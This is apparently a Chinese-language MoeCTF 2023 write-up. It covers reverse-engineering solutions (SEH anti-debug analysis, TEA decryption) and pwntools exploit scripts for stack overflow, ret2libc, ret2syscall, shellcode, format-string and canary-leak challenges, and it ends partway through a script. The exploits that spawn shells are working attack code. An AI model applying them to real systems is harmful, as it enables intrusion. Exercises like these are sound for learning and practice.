hWbdParent是窗口的句柄，msg是消息的id，这个wparam和lparam好像是会根据消息的不同穿过来不同的附加消息。 关键是这里，这里是有个c++类，ida将这个类平坦开了，显示很奇怪，所以还是从汇编的视图去分析逻辑 12345678910111213141516171819if ( (unsigned __int16)wParam == 1 ) { DlgItem = GetDlgItem(hWndParent, 2); GetWindowTextW(DlgItem, String, 1024); sub_450C94(String); v13 = 0; sub_450A0A(v7, v8); LOBYTE(v13) = 1; sub_450C94(a91); if ( (unsigned __int8)sub_4531AB(v7, v6) ) MessageBoxW(hWndParent, Text, L&quot;hint&quot;, 0); else MessageBoxW(hWndParent, L&quot;Sorry, flag error.&quot;, L&quot;hint&quot;, 0); sub_4529B8(v6); LOBYTE(v13) = 0; sub_4529B8(v7); v13 = -1; sub_4529B8(v8); } 从inputString开始分析，这里ecx看起来很奇怪，查询资料才知道这个ecx是一个this指针 1234push eax ; hWndcall ds:GetWindowTextWcmp esi, espcall j___RTC_CheckEsp 1234567891011lea eax, [ebp+String]push eaxlea ecx, [ebp+var_498]call sub_450C94mov [ebp+var_4], 0lea eax, [ebp+var_498]push eaxlea ecx, [ebp+var_4BC]push ecxcall sub_450A0Aadd esp, 8 unwind这个题一开始咱遇到挺多问题的，不过也学会 seh的程序怎么分析，哪些操作会出现异常被try块捕获 动态调试 一点点找反调试函数的方法。 一开始我就从静态上分析，先去学习了SEH大概是怎么样的一个东西，然后明白了SEH会对我分析程序运行顺序流程有影响，所以我需要关注什么汇编代码会出现异常，try块捕获后会跳转到哪里。 123456.text:00415908 ; __try { // __except at loc_415928.text:00415908 mov [ebp+ms_exc.registration.TryLevel], 0.text:0041590F mov large dword ptr ds:0, 0.text:0041590F ; } // starts at 415908.text:00415919 mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh.text:00415920 jmp short loc_41597A 这是第一个try块，这里往ds:0 写数据是会触发一个异常的，查询资料后知道, ds:0是操作系统捕获空指针解引用的地址，这个地址是受保护的，写数据会触发异常 1234567891011121314151617181920212223242526272829303132333435363738394041.text:00411820 sub_411820 proc near ; CODE XREF: sub_4110FF↑j.text:00411820.text:00411820 var_E4 = dword ptr -0E4h.text:00411820 var_10 = byte ptr -10h.text:00411820 var_C = dword ptr -0Ch.text:00411820 var_4 = dword ptr -4.text:00411820.text:00411820 push ebp.text:00411821 mov ebp, esp.text:00411823 sub esp, 0D0h.text:00411829 push ebx.text:0041182A push esi.text:0041182B push edi.text:0041182C lea edi, [ebp+var_10].text:0041182F mov ecx, 4.text:00411834 mov eax, 0CCCCCCCCh.text:00411839 rep stosd.text:0041183B mov eax, ___security_cookie.text:00411840 xor eax, ebp.text:00411842 mov [ebp+var_4], eax.text:00411845 mov [ebp+var_C], offset loc_4112FD.text:0041184C push [ebp+var_C].text:0041184F push large dword ptr fs:0.text:00411856 mov large fs:0, esp.text:0041185D int 3 ; Trap to Debugger.text:0041185E mov eax, [esp+0E4h+var_E4].text:00411861 mov large fs:0, eax.text:00411867 add esp, 8.text:0041186A pop edi.text:0041186B pop esi.text:0041186C pop ebx.text:0041186D mov ecx, [ebp+var_4].text:00411870 xor ecx, ebp ; StackCookie.text:00411872 call j_@__security_check_cookie@4 ; __security_check_cookie(x).text:00411877 add esp, 0D0h.text:0041187D cmp ebp, esp.text:0041187F call j___RTC_CheckEsp.text:00411884 mov esp, ebp.text:00411886 pop ebp.text:00411887 retn.text:00411887 sub_411820 endp 第二个异常的位置就是在这里，int3是 x86里面的一个软中断指令，用来触发断点异常，调试器会用这个int3实现断点功能(这有个坑，关于动态调试的) 然后得出的逻辑是 inputString char[] 64这么一个数据 -&gt; 分成八个等长的子串 -&gt;前四个使用tea1和key[]数组加密-&gt;后四个使用tea2和key[]数组加密-&gt; cmp inputString flagString -&gt; jz flag success 大概是这么一个逻辑 遇到的第一个问题是，这个tea1和tea2其实是一个东西，call的时候咱没看清楚函数名字(反编译插件显示有些问题，就去跟着两个tea encode写了一遍代码qaq 。不过发现在分析算法的时候，一开始总点关注对输入输出是怎么样的一个处理流程，然后再给偏移地址全部打上标签，然后就能很快分析清楚了qaq) 然后写了decode之后怎么解都是只能解出前半段，看来看去逻辑都没有问题，调试的话就会莫名其妙的闪退 从main开始往下单步会发现 1234.text:0041589A call j_@__CheckForDebuggerJustMyCode@4 ; __CheckForDebuggerJustMyCode(x).text:0041589F call sub_4113E3.text:004158A4 mov esi, esp.text:004158A6 push offset Buffer ; &quot;Welcome to moectf2023!!! Now you find Y&quot;... 运行到4113E3就会闪退，跟进去看一下 12.text:004117B7 push offset ModuleName ; &quot;Ntdll&quot;.text:004117BC call ds:GetModuleHandleA 1.text:004117FF .text:004117FF call [ebp+var_14] 发现这里面加载了ntdll ，然后在这里call [ebp+var_14]退出了把这个sub_4113E3 nop掉发现能往下调试了 下面作用类似于scanf 获取输入的函数里面也会闪退 1234567891011121314151617181920212223242526272829303132333435.text:00411890 ; int __cdecl sub_411890(char *Format, char).text:00411890 sub_411890 proc near ; CODE XREF: sub_4113CA↑j.text:00411890.text:00411890 Format = dword ptr 8.text:00411890 arg_4 = byte ptr 0Ch.text:00411890.text:00411890 push ebp.text:00411891 mov ebp, esp.text:00411893 sub esp, 0C0h.text:00411899 push ebx.text:0041189A push esi.text:0041189B push edi.text:0041189C mov edi, ebp.text:0041189E xor ecx, ecx.text:004118A0 mov eax, 0CCCCCCCCh.text:004118A5 rep stosd.text:004118A7 mov ecx, offset unk_41C063.text:004118AC call j_@__CheckForDebuggerJustMyCode@4 ; __CheckForDebuggerJustMyCode(x).text:004118B1 call sub_4113E3.text:004118B6 mov eax, dword ptr [ebp+arg_4].text:004118B9 push eax ; char.text:004118BA mov ecx, [ebp+Format].text:004118BD push ecx ; Format.text:004118BE call sub_4113C5.text:004118C3 add esp, 8.text:004118C6 pop edi.text:004118C7 pop esi.text:004118C8 pop ebx.text:004118C9 add esp, 0C0h.text:004118CF cmp ebp, esp.text:004118D1 call j___RTC_CheckEsp.text:004118D6 mov esp, ebp.text:004118D8 pop ebp.text:004118D9 retn.text:004118D9 sub_411890 endp call sub_4113E3 这个地方，下面还有个call那个是获取输入的 123456.text:004117B7 push offset ModuleName ; &quot;Ntdll&quot;.text:004117BC call ds:GetModuleHandleA .text:004117F1 call ds:GetCurrentThread .text:004117FF call [ebp+var_14] 这里也加载了ntdll 获取了线程，在call [ebp+var_14] 这断掉了，nop掉call sub_4113E3后程序能正常调试了 上面说的坑是，在nop掉这些东西后开始调试程序，他只能从start开始，start里面有一个int3，我看这个也没有什么影响，就给他抛出了，后面到了程序逻辑里面，程序逻辑里面也有个int3，ida自动给我抛出了。一开始start那不抛出int3他就没有什么问题 动态了之后才知道，inputString 后32位 encode了两次，所以第一次写脚本只能解出一半 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152def decrypt(ciphertext, key): v0, v1 = ciphertext k0, k1, k2, k3 = key sum_ = 0xC6EF3720 for _ in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum_) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum_) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF sum_ -= 0x9E3779B9 sum_ = sum_ &amp; 0xFFFFFFFF return (v0, v1)def key_to_integers(key_str): padded_key = key_str.ljust(16, '\\0') return tuple(int.from_bytes(padded_key[i:i+4].encode(), 'little') for i in range(0, len(padded_key), 4))def data_bytes_to_tuples(data_bytes): data_list = [int.from_bytes(data_bytes[i:i+4], 'little') for i in range(0, len(data_bytes), 4)] return list(zip(data_list[::2], data_list[1::2]))def tuples_to_bytes(data_tuples): byte_list = [item.to_bytes(4, 'little') for sublist in data_tuples for item in sublist] return b''.join(byte_list)keys = [&quot;DX3906&quot;, &quot;doctor3&quot;, &quot;FUX1AOYUN&quot;, &quot;R3verier&quot;]key_integers = [key_to_integers(key) for key in keys]flag1 = [90, 227, 107, 228, 6, 135, 2, 79, 67, 223, 205, 193, 119, 152, 107, 219, 143, 56, 67, 153, 227, 147, 34, 181, 35, 253, 176, 28, 229, 227, 238, 206]flag2 = [47, 29, 173, 43, 164, 21, 152, 249, 216, 235, 37, 250, 107, 33, 183, 114, 185, 3, 51, 46, 217, 76, 235, 123, 245, 167, 72, 249, 144, 157, 56, 252]# flag1 decodef1 = data_bytes_to_tuples(flag1)decrypted_data_list_1 = [decrypt(data_tuple, key_integer) for data_tuple, key_integer in zip(f1, key_integers)]decrypted_bytes_1 = tuples_to_bytes(decrypted_data_list_1)decrypted_string_1 = decrypted_bytes_1.decode(errors='replace')# flag2 decode1f2 = data_bytes_to_tuples(flag2)decrypted_data_list_2_1st = [decrypt(data_tuple, key_integer) for data_tuple, key_integer in zip(f2, key_integers)]decrypted_bytes_2_1st = tuples_to_bytes(decrypted_data_list_2_1st)#flag2 decode2f2_2nd = data_bytes_to_tuples(decrypted_bytes_2_1st)decrypted_data_list_2_2nd = [decrypt(data_tuple, key_integer) for data_tuple, key_integer in zip(f2_2nd, key_integers)]decrypted_bytes_2_2nd = tuples_to_bytes(decrypted_data_list_2_2nd)decrypted_string_2_2nd = decrypted_bytes_2_2nd.decode(errors='replace')result = decrypted_string_1 + decrypted_string_2_2ndprint(result) 得到flag moectf{WoOo00Oow_S0_interesting_y0U_C4n_C41l_M3tW1c3_BY_Unw1Nd~} unwind栈展开的例子 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;#include &lt;stdexcept&gt;class ClassA {public: ClassA() { std::cout &lt;&lt; &quot;ClassA constructed.\\n&quot;; } ~ClassA() { std::cout &lt;&lt; &quot;ClassA destructed.\\n&quot;; }};class ClassB {public: ClassB() { std::cout &lt;&lt; &quot;ClassB constructed.\\n&quot;; } ~ClassB() { std::cout &lt;&lt; &quot;ClassB destructed.\\n&quot;; }};class ClassC {public: ClassC() { std::cout &lt;&lt; &quot;ClassC constructed.\\n&quot;; throw std::runtime_error(&quot;Exception from ClassC constructor&quot;); } ~ClassC() { std::cout &lt;&lt; &quot;ClassC destructed.\\n&quot;; }};int main() { try { ClassA a; ClassB b; ClassC c; } catch (const std::exception&amp; e) { std::cout &lt;&lt; &quot;Caught exception: &quot; &lt;&lt; e.what() &lt;&lt; std::endl; } return 0;} EZNET[未解决-没思路]PWNtest_nc查看gift提示flag是隐藏的，ls -al 发现.flag cat moectf{BEgOXB3-Sk6bTQrihNqE5rw4G46OQIHS} baby_calculator后面发现flag出不来，是因为有个换行符，recvline到换行符就停了，用recvrepeat设置个超时时间就读出来了 12345678910111213141516171819202122232425262728293031from pwn import *import repattern = r&quot;(\\d+)\\s*([\\+\\-\\*\\/])\\s*(\\d+)\\s*=\\s*(\\d+)&quot;p = remote('192.168.144.193',56098)p.recvregex(b'Now..start!\\n')for i in range(100): print(p.recvline()) ; print(p.recvline()) s = p.recvline().decode('utf-8') match = re.search(pattern, s) n1, operator, n2, r = match.groups() n1, n2 , r = int(n1) ,int(n2) , int(r) print(n1, operator, n2, r) if operator == '+': n1 = n1 + n2 elif operator == '-': n1 = n1 - n2 if(r == n1): p.sendline(b'BlackBird\\n') else: p.sendline(b'WingS\\n')print(p.recvrepeat(5)) moectf{H4ve_y0u_rea11y_useD_Pwnt00ls??????} fdhttps://wiyi.org/linux-file-descriptor.html https://www.cnblogs.com/love-jelly-pig/p/10048483.html 去查询了一下资料，当进程打开一个文件内核会返回一个FILE Descriptor,进程可以通过fd对文件进行操作 这个程序的意思是输入fd,然后通过fd读数据输出，fd 0 1 2都被系统占用了分别是stdin stdout stderr,所以3是flag。 fd被销毁前通过dup2函数将文件描述符复制到了new_fd。new_fd = 4 * 3 | 0x29A。new_fd =670,所以只需要传入670就能将flag读出来 1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **envp){ int input; // [rsp+4h] [rbp-6Ch] BYREF int fd; // [rsp+8h] [rbp-68h] int new_fd; // [rsp+Ch] [rbp-64h] char flag[80]; // [rsp+10h] [rbp-60h] BYREF unsigned __int64 v8; // [rsp+68h] [rbp-8h] v8 = __readfsqword(0x28u); input = 0; init(); puts(&quot;Do you know fd?&quot;); fd = open(&quot;./flag&quot;, 0, 0LL); new_fd = (4 * fd) | 0x29A; dup2(fd, new_fd); close(fd); puts(&quot;Which file do you want to read?&quot;); puts(&quot;Please input its fd: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;input); read(input, flag, 0x50uLL); puts(flag); return 0;} 1moectf{3H1lDl8GIZHEi0_IWpA4krCAChNI3bpd} int_overflowhttps://ctf-wiki.org/pwn/linux/user-mode/integeroverflow/introduction/ int32溢出的原理是进位的时候把最高位的正负符号位改变了，所以变成负数了。 所以要计算变成-114514，要明白 i32的大小范围 2**31 -1。-1是因为有个0 所以只需要计算2**32 - 114514 就能求出溢出到-114514需要输入多少，得到4294852782 123456789101112131415void __cdecl vuln(){ int n; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v1; // [rsp+8h] [rbp-8h] v1 = __readfsqword(0x28u); puts(&quot;Welcome to Moectf2023.&quot;); puts(&quot;Do you know int overflow?&quot;); puts(&quot;Can you make n == -114514 but no '-' when you input n.&quot;); puts(&quot;Please input n:&quot;); get_input(&amp;n); if ( n == -114514 ) backdoor(); puts(&quot;Maybe you should search and learn it.&quot;);} 1moectf{6iD1QTUJSScIKT-_6vm-6nWQs8GvJK6-} ret2text_321234567891011ssize_t vuln(){ size_t nbytes; // [esp+Ch] [ebp-5Ch] BYREF char buf[84]; // [esp+10h] [ebp-58h] BYREF puts(&quot;Welcome to my stack in MoeCTF2023!&quot;); puts(&quot;What's your age?&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;nbytes); puts(&quot;Now..try to overflow!&quot;); return read(0, buf, nbytes);} 程序里面有plt system的，有个/bin/sh的gadget这里只需要计算buf到返回地址的距离，system填充栈底下的返回地址，然后填充system的返回地址还有/bin/sh的地址，就能将/bin/sh传参到system 123456789101112131415161718192021222324252627from pwn import *ip = &quot;127.0.0.1&quot;port = 58873p = remote(ip, port)# p = process(&quot;./pwn&quot;)line = p.recvline() ;print(line) # Welcome to my stack in MoeCTF2023!line = p.recvline() ;print(line) # What's your age?system_addr = 0x8049070 # plt func systemcommand_addr = 0x804c02c # /bin/sh addr# offset = char buf[84] + var_4 4 byte = s ; s + 4 = rpayload = b'A' * (84 + 4 + 4)payload += p32(system_addr)payload += b'C' * 4payload += p32(command_addr)p.sendline(str(len(payload)).encode())line = p.recvline() ;print(line) # What's your age?p.sendline(payload)p.interactive() 1moectf{eV9akrlQlwtJVvpBAk45YMO18UHvBv4n} ret2text_64咱是笨蛋，因为64位栈对齐想了好久 https://blog.csdn.net/hu_c_t_f/article/details/131902515 64位使用rdi传第一个参数 传参的顺序分别是rdi rsi rdx rcx r8 r9，所以需要找一个pop rdi ret的gadget 使用ROPgadget –binary pwn | grep pop | grep rdi 就能筛选 offset + ret + gadget + /bin/sh + func system() 123456789101112131415161718192021222324252627282930from pwn import *ip = &quot;localhost&quot;port = 50215p = remote(ip, port)# p = process(&quot;./pwn&quot;)line = p.recvline() ;print(line)line = p.recvline() ;print(line)line = p.recvline() ;print(line)string_addr = 0x404050 # bin/sh addressgadget_addr = 0x4011be # pop rdi retsystem_addr = 0x401090 # system(char * command) addressret_addr = 0x040101a # ret addrpayload = b'A' * (80 + 8) # offset buf[80] + 8 = rpayload += p64(ret_addr) #64位 gadget中有个ret 消耗了8字节，这里需要再ret一次保持栈对齐payload += p64(gadget_addr)payload += p64(string_addr)payload += p64(system_addr)p.sendline(str(len(payload)).encode())line = p.recvline() ;print(line)p.sendline(payload)p.interactive() 1moectf{KsAymn0LqrzuRUcO3QI71N_u3UzZz1m7} shellcode_level0这里的意思是，我传进去的数据会先放到rbp+var_70的位置，然后下面会call我传进去的数据，查询了一下然后根据题目的提示，我只需要用pwntools中的shellcraft来生成shellcode然后sendline过去就好了 123456789lea rax, [rbp+var_70]mov rdi, raxmov eax, 0call _getslea rax, [rbp+var_70]mov [rbp+var_78], raxmov rdx, [rbp+var_78]mov eax, 0call rdx 1234567891011121314from pwn import *ip = &quot;192.168.1.111&quot;port = 58988p = remote(ip, port)context(arch='amd64', os='linux')# p = process(&quot;./shellcode_level0&quot;)shellcode = asm(shellcraft.sh())payload = shellcodep.sendline(payload)p.interactive() 这里要先设置一下context函数，设置好平台再生成shellcode sendline过去 1moectf{ddP0bHRsw_l0B6HQnDFtG62TOXAVXFv6} shellcode_level1mmap和mprotect函数是干嘛用的？我的shellcode怎么没有执行权限？ mmap是类似于malloc但是可以指定内存的读写执行权限是怎么样的，然后mprotect是在已经分配好的内存上面修改内存的权限 在case4里面7的意思是PROT_READ | PROT_WRITE | PROT_EXEC 的结果，可读可写可执行 12int mprotect(void *addr, size_t len, int prot);mprotect(paper4, 0x1000uLL, 7); 然后只需要case4 shellcode就没问题了，pwntools脚本是这样写的 123456789101112131415161718192021import posixpathfrom pwn import *ip = &quot;192.168.129.194&quot;port = 57941p = remote(ip, port)# p = process(&quot;./shellcode_level1&quot;)context(arch='amd64', os='linux')line = p.recvline(); print(line) # Which paper will you choose?p.sendline(b'4') # mprotect(paper4, 0x1000uLL, 7);line = p.recvline(); print(line) # what do you want to write?shellcode = asm(shellcraft.sh()) ; payload = shellcodep.sendline(payload) #p.interactive() uninitialized_key1234567891011void __cdecl get_name(){ int age; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v1; // [rsp+8h] [rbp-8h] v1 = __readfsqword(0x28u); age = 0; puts(&quot;Please input your age:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;age); printf(&quot;Your age is %d.\\n&quot;, (unsigned int)age);} 1234567891011121314void __cdecl get_key(){ int key; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v1; // [rsp+8h] [rbp-8h] v1 = __readfsqword(0x28u); puts(&quot;Please input your key:&quot;); __isoc99_scanf(&quot;%5d&quot;, &amp;key); if ( key == 114514 ) { puts(&quot;This is my flag.&quot;); system(&quot;cat flag&quot;); }} key和age在栈中的地址一样的，所以只需要在get_name中设置age变量为114514，然后scanf这里输入一个非数字的符号，就不会初始化，比如说=号 1moectf{V5glae83rq6G1nSbZa6pGtWaflnHjE1U} format_level0123456789101112131415161718192021222324252627int __cdecl main(int argc, const char **argv, const char **envp){ int fd; // [esp+0h] [ebp-B0h] char flag[80]; // [esp+4h] [ebp-ACh] BYREF char name[80]; // [esp+54h] [ebp-5Ch] BYREF unsigned int v7; // [esp+A4h] [ebp-Ch] int *p_argc; // [esp+A8h] [ebp-8h] p_argc = &amp;argc; v7 = __readgsdword(0x14u); init(); memset(flag, 0, sizeof(flag)); memset(name, 0, sizeof(name)); fd = open(&quot;flag&quot;, 0, 0); if ( fd == -1 ) { puts(&quot;open flag error!&quot;); exit(0); } read(fd, flag, 0x50u); close(fd); puts(&quot;Please input your name:&quot;); read(0, name, 0x50u); printf(&quot;Your name is: &quot;); printf(name); return 0;} 搜索后发现 printf(name)这里存在格式化字符串漏洞，可以用%x来泄露栈上的数据，没有加参数列表似乎是从栈起始地址开始读，%x是以16进制输出数据，32位是4字节。 payload 1%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x linux上是小端序存储，所以需要反转一下变成大端序显示 123456789flag = &quot;ff886d4c.50.56648362.ff886e74.0.3.63656f6d.617b6674.4c4c5059.67426344.6e577272.70453348.484b5041.784f3151.64774731.7d515737.a.0.0.0.0.0.0.0.0.0.252e7825&quot;flag = flag.split('.')def convert(segment): return segment[6:8] + segment[4:6] + segment[2:4] + segment[0:2]decoded_str_big_endian = ''.join(bytes.fromhex(convert(flag)).decode('ascii', errors='ignore') for flag in flag if len(flag) == 8)print(decoded_str_big_endian) 1moectf{aYPLLDcBgrrWnH3EpAPKHQ1Ox1Gwd7WQ} PIE_enabled查询了一下PIE是一种程序每次运行时候都能加载到不同内存地址的技术，每次加载整个程序中的代码数据和堆栈都会随机化 然后这里把vuln函数的地址打印了出来，查询资料后发现，pie是基地址会变，但是偏移地址是不变的，可以用这里打印的vuln的地址计算出基地址然后用偏移地址来确定数据和函数的位置 12345678ssize_t vuln(){ char buf[80]; // [rsp+0h] [rbp-50h] BYREF puts(&quot;This time i will give u a gift!\\n&quot;); printf(&quot;Vuln's address is:%p\\n&quot;, vuln); return read(0, buf, 0x100uLL);} 具体怎么操作我是看这篇文章学会的https://ir0nstone.gitbook.io/notes/types/stack/pie/pie-exploit 首先需要将context.binary 设置成 ELF(./pwn) elf.address = vuln - elf.sym[‘vuln’] 这里根据elf的符号表的偏移 算出基地址 下面payload中gadget只需要加上elf.address 这个基地址就可以了 12345678910111213141516171819202122232425262728from pwn import *#ip = &quot;192.168.1.129&quot;port = 57376elf = context.binary = ELF('./pwn')# p = process()p = remote(ip, port)line = p.recvuntil(b&quot;This time i will give u a gift!\\n&quot;); print(line) # This time i will give u a gift!\\nline = p.recvuntil(b&quot;Vuln's address is:&quot;); print(line) # Vuln's address is:%p\\nline = p.recvline(); print(line)line = line.replace(b&quot;\\n&quot;, b&quot;&quot;); print(line)vuln = int(line, 16)elf.address = vuln - elf.sym['vuln']payload = b'a' * (80 + 8) # offset = buf[80] + 8(byte) = rpayload += p64(elf.address + 0x00101a) # ret_addresspayload += p64(elf.address + 0x001323) # gadget_address pop rdi ; retpayload += p64(elf.address + 0x004010) # /bin/sh addresspayload += p64(elf.sym['system'])p.sendline(payload)p.interactive() 1moectf{3N3evVehPhOpH9nNLAd6KmD_Z8jhY36t} ret2libc12345678ssize_t vuln(){ char buf[80]; // [rsp+0h] [rbp-50h] BYREF puts(&quot;I hide the b4ckdoor..\\n&quot;); puts(&quot;But..maybe libc can help u??\\n&quot;); return read(0, buf, 0x100uLL);} 根据题目意思还有程序逻辑，system函数被移除了，所以要到libc里面找 linux每次加载程序的时候libc的基地址都会改变，但是libc内的偏移是不变的，想要调用system这个函数，首先要泄露libc的基地址，然后根据偏移地址去拿到system，这时候可以构造一个这样的调用链puts_plt(puts_got) 把got表中的puts的位置打印出来， 然后用 puts_got 减去libc中基地址与puts的偏移关系，就能拿到libc的基地址，这时候我们需要再回到vuln function里面，再read一遍，用之前的libc_base + system偏移 以及 libc_base + bin/sh的偏移 把shell拿到 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *elf = context.binary = ELF('./pwn')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')ip = &quot;192.168.1.111&quot;port = 63227# p = process()p = remote(ip,port)line = p.recvuntil(b&quot;I hide the b4ckdoor..\\n&quot;); print(line)line = p.recvline(); print(line)line = p.recvuntil(b&quot;But..maybe libc can help u??\\n&quot;); print(line)line = p.recvline(); print(line)puts_got = elf.got['puts'] # got 表中的 puts地址puts_plt = elf.plt['puts'] # pltgadget_address = 0x40117e # pop rdi; retpayload = b'A' * (80 + 8) # offset rpayload += p64(gadget_address) # pop rdi; retpayload += p64(puts_got) # puts_plt(put_gots)payload += p64(puts_plt) # puts(put_gots) 打印put_got的地址payload += p64(0x4011E8)p.sendline(payload)# 接收泄露的地址leaked_puts = u64(p.recvline().strip().ljust(8, b'\\x00'))print(f&quot;Leaked puts address: {hex(leaked_puts)}&quot;)# 计算libc的基址put_offset = libc.symbols['puts']libc_base = leaked_puts - put_offsetprint(f&quot;Libc base address: {hex(libc_base)}&quot;)# gdb.attach(p)#################################################################################### 重新回到vuln 然后再read一遍，有了libc的基址 就能根据偏移拿到system /bin/shline = p.recvuntil(b&quot;I hide the b4ckdoor..\\n&quot;); print(line)line = p.recvline(); print(line)line = p.recvuntil(b&quot;But..maybe libc can help u??\\n&quot;); print(line)line = p.recvline(); print(line)system = libc_base + libc.symbols['system'] #system实际地址binsh = libc_base + next(libc.search(b'/bin/sh')) # /bin/sh 实际地址ret_address = 0x40101a # retgadget_address = 0x40117e # pop rdi retpayload = b'a' * (80 + 8) # offset rpayload += p64(ret_address) # retpayload += p64(gadget_address) # pop rdi retpayload += p64(binsh)payload += p64(system)p.sendline(payload)p.interactive() 1moectf{zqCYX9rID5N8EvdK6cRpjzxGiKua-j6-} ret2syscall64位 syscall会根据rax的值去调用系统，其中有个execve的函数能够执行shell命令，编号是59。 用法是先设置rax的值为59来选择execve这个函数 然后设置rdi rsi rdx 三个寄存器传递/bin/ sh null null三个参数过去 最后syscall就好了 32位和64位不同的是传参的调用约定和编号 https://www.yuque.com/cyberangel/rg9gdm/iszq8p https://publicki.top/old/syscall.html#x86_64-64_bit 123456789101112131415161718192021222324252627282930313233from pwn import *elf = context.binary = ELF('./ret2syscall')ip = &quot;192.168.129.194&quot;port = 57614# p = process()p = remote(ip,port) #line = p.recvline() ; print(line) # Can you make a syscall?syscall_addr = 0x401185pop_rax_ret = 0x40117epop_rdi_ret = 0x401180pop_rsi_ret = 0x401182pop_rdx_ret = 0x401183pop_rsi_rdx_ret = 0x401182binsh = 0x404040payload = flat( [ b'a' * (64 + 8), # offset r pop_rax_ret, 59, # execve(&quot;/bin/sh&quot; , NULL , NULL) pop_rdi_ret, binsh , pop_rsi_rdx_ret , 0 , 0 , syscall_addr ])p.sendline(payload)p.interactive() 1moectf{3e8lLsjSF62Ebm55dV_11iZHHp7TFVUZ} shellcode_level2这里如果输入数据的第一个字节不为0的话，test al al 会将zf寄存器设置成1，然后会jz初始化我输入的数据，所以只需要保证第一个字节是0x00就好了 1234lea rax, [rbp+s]movzx eax, byte ptr [rax]test al, aljz short loc_125D 12345lea rax, [rbp+s]mov edx, 64h ; 'd' ; nmov esi, 0 ; cmov rdi, rax ; scall _memset 1234567891011loc_125D:lea rax, [rbp+s]add rax, 1mov [rbp+var_78], raxmov rdx, [rbp+var_78]mov eax, 0call rdxmov eax, 0mov rdx, [rbp+var_8]sub rdx, fs:28hjz short locret_128D 123456789101112131415from pwn import *ip = &quot;192.168.129.194&quot;port = 63480p = remote(ip, port)context(arch='amd64', os='linux')# p = process(&quot;./shellcode_level2&quot;)shellcode = asm(shellcraft.sh())shellcode = b'\\x00' + shellcodepayload = shellcode # #p.sendline(payload)p.interactive() 1moectf{5WxAPxrGkQOTgaLi3fXkBZV8IKQEDBPF} uninitialized_key_plus和uninitialized_key类似，区别在get_name函数那是scanf %24s，然后位置有些不太一样ida里面看内存布局算一下就好了 123456789101112131415161718192021from pwn import *ip = &quot;192.168.129.194&quot;port = 49771p = remote(ip, port)# p = process(&quot;./uninitialized_key_plus&quot;)line = p.recvline(); print(line) # Welcome to Moectf 2023.line = p.recvline(); print(line) # Do you know stack?line = p.recvline(); print(line) # Please input your name:payload = b'A' * 20payload += p32(114514) # 转四字节p.sendline(payload)line = p.recvline(); print(line) # Your name is %s.\\nline = p.recvline(); print(line) # Please input your key:p.sendline(b'=')p.interactive() 1moectf{HEPwrkfbVLeO2t_8ea0K6PipJiGm2DQP} format_level1[补]格式化字符串修改 dragon.HP 就好了，修改pwner的atk 字符串会长一些，输入长度不够 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *from LibcSearcher import *context(os='linux',arch='i386',log_level='debug')elf = context.binary = ELF('./format_level1')libc = elf.libcis_debug = 0if(is_debug): p = process()else: ip = &quot;192.168.1.101&quot; port = 54822 p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda : p.recvline()ru = lambda x: p.recvuntil(x)r_leek_libc_64 = lambda : u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))r_leek_libc_32 = lambda : u32(p.recvuntil(b'\\xf7')[-4:])sl(b'3')# g(p)payload = fmtstr_payload(7,{0x804c00c:1})sa(&quot;Input what you want to talk: \\n&quot;,payload)sl(b'1')p.interactive() little_canary[补]第一次read 覆盖canary的低位00把canary打印出来，然后带上canary打ret2libc ，题目没有给libc，所以要用libcsearcher一下 ret2libc的话，构造一个 puts_plt(puts_got)的函数调用去打印一个libc的地址，算出libc_base后，libc中有binsh字符和system函数，就可以构造一个system(/bin/sh)的函数调用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from pwn import *from LibcSearcher import *context(os='linux',arch='amd64',log_level='debug')elf = context.binary = ELF('./little_canary')libc = elf.libcis_debug = 0if(is_debug): p = process()else: ip = &quot;192.168.1.101&quot; port = 64352 p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda : p.recvline()ru = lambda x: p.recvuntil(x)r_leek_libc_64 = lambda : u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))r_leek_libc_32 = lambda : u32(p.recvuntil(b'\\xf7')[-4:])payload = b'a' * (0x50 - 8 + 1)sa(&quot;What's your name?\\n&quot;,payload)r(len(payload))leak_canary = b'\\x00' + r(7)success(leak_canary)rdi = 0x0000000000401343payload = flat([ b'a' * (0x50 - 8),leak_canary,b'a' * 8, rdi,elf.got['puts'],elf.plt['puts'], elf.sym['main']])sa(b&quot;I put a canary on my stack!\\n&quot;,payload)leak_addr = u64(ru(b'\\x7f')[-6:].ljust(8,b'\\x00'))# libc_base = leak_addr - libc.sym['puts']libc = LibcSearcher('puts',leak_addr)libc_base = leak_addr - 